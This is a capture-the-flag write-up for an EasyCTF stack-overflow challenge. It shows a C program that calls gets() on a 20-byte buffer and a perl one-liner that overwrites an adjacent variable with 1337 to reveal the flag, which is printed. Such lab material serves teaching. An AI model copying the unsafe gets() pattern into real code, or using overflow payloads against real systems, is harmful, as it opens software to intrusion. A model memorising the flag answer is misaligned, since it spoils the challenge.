---
layout: writeup
title: Buffering…
level: 
difficulty: 
points: 
categories: []
tags: []
flag: easyctf{i_wish_everything_were_th1s_34sy}
---
**Challenge**  
Can you overflow the stack? Try it at /problems/overflow1 on the EasyCTF
shell server. The source is available at
/problems/overflow1/overflow1.c, and the program you're trying to
overflow is at /problems/overflow1/overflow1. Good luck!

## Solution

overflow1.c:

    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>
    
    int main() {
        char buf[20];
        int x = 0;
        gets(buf);
        if (x == 1337) {
            gid_t gid = getegid();
            setresgid(gid, gid, gid);
            FILE *fp;
            fp = fopen("flag.txt", "r");
            char flag[64];
            fgets(flag, 64, (FILE*) fp);
            printf("Here's a flag: %s\n", flag);
        }
        printf("%d\n", x);
        return 0;
    }
{: .language-c}

So if we write more that 20 bytes to the buffer we overwrite variable x,
if we can set this to the value 1337, we get the flag. Luckily it prints
the contents of x at the end of execution. We figure out that after
printing 28 characters we start to overwrite the variable x. 1337 is
0x539 in hex, we print this in little endian after 28 other characters
to get the flag:

    $ perl -e 'print "a"x28 . "\x39\x05" ' | ./overflow1
    
    Here's a flag: easyctf{i_wish_everything_were_th1s_34sy}
    
    1337

